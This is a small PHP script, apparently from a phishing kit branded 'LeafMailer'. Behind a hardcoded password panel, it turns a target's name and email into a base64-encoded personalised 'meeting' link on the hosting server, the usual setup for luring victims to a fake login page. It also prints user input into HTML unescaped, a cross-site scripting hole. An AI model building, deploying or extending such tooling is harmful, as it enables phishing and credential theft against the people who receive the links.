<?php

$password = "ay@123"; // Password 



session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);

$leaf['version']="2.8";
$leaf['website']="leafmailer.pw";


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre style='text-align: center;' align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}

session_write_close();
print "<pre style='text-align: center;' align=center><form method=post>Name: <input type='text' name='name'><br>
Email: <input type='email' name='email' required><br><br><input type='submit' name='sub' value='Generate Link'></form></pre>";
if(isset($_POST['sub']) && $_POST['email'] != ''){
$link = "https://".$_SERVER['HTTP_HOST']."/meeting1027?session=".base64_encode($_POST['email'].'||'.ucwords("$_POST[name]").'');
print "<pre style='text-align: center;' align=center><br>Meeting Link: <a href='$link' target='_blank'>$link</a></pre>";	
}
?>


